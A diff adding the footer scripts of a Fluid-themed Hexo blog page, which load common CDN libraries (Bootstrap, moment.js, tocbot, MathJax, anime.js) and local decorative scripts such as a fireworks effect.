+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/custom/custom.js"></script>
+<script src="/custom/firework.js"></script>
+<script src="/custom/label-page.js"></script>
+<script src="/custom/moving.js"></script>
+<script src="/custom/welcome.css.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+<!-- <canvas class="fireworks" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;"></canvas> -->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/custom/firework.js"></script>
